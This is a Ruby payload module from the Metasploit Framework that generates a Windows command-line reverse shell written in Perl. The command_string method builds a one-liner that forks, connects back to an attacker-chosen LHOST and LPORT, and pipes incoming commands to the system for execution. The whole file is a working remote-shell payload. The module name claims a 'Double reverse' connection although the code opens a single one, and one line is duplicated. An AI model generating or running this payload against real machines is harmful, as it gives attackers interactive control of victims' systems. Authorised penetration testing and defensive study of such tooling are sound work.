##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command, Double reverse TCP connection (via Perl)',
      'Description'   => 'Creates an interactive shell via perl',
      'Author'        => ['cazz', 'patrick'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    cmd   = %{perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\\"#{lhost}:#{datastore['LPORT']}\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"}
  end

end
